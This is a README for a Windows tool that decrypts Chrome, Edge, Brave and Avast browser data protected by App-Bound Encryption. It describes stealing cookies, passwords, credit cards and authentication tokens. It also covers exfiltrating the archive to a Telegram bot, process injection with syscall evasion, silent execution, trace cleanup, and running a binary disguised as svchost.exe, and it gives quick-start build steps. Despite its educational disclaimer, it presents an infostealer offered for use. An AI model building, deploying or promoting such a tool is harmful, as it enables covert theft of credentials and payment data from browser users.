# Chrome App-Bound Encryption Decryption

Advanced tool for extracting and decrypting data from Chromium-based browsers using App-Bound Encryption (ABE).

## Features

- Decrypts Chrome/Edge/Brave App-Bound Encryption keys using COM IElevator
- Extracts cookies, passwords, credit cards, and authentication tokens
- Automatic Telegram upload with encryption
- Process injection with syscall evasion
- Silent execution (no console window)
- Automatic cleanup of all traces

## Supported Browsers

- Google Chrome
- Microsoft Edge
- Brave Browser
- Avast Secure Browser

## Requirements

- Windows 10/11 (x64)
- Visual Studio 2019+ with C++ Desktop Development
- Telegram Bot (for data exfiltration)

## Quick Start

1. Copy `config_template.json` to `config.json`
2. Edit `config.json` with your Telegram credentials
3. Run `python generate_config.py config.json`
4. Open Developer Command Prompt for VS
5. Run `make.bat`
6. Execute `svchost.exe`

See [BUILD.md](BUILD.md) for detailed instructions.

## How It Works

1. Creates suspended browser process
2. Injects payload DLL
3. Uses COM IElevator to decrypt ABE master key
4. Extracts encrypted data from SQLite databases
5. Decrypts data using AES-GCM
6. Creates ZIP archive and uploads to Telegram
7. Cleans up all temporary files

## Technical Highlights

- Direct syscalls for API evasion
- ChaCha20 payload encryption
- XOR string obfuscation
- Named pipe IPC
- COM interface hijacking
- SQLite database parsing

## Disclaimer

This tool is for educational and security research purposes only. Use responsibly and only on systems you own or have explicit permission to test.

## License

MIT License - See LICENSE file for details

## Credits

This project is based on and extends the original work by [xaitax](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/).

Special thanks to the security research community for their work on Chrome's App-Bound Encryption.
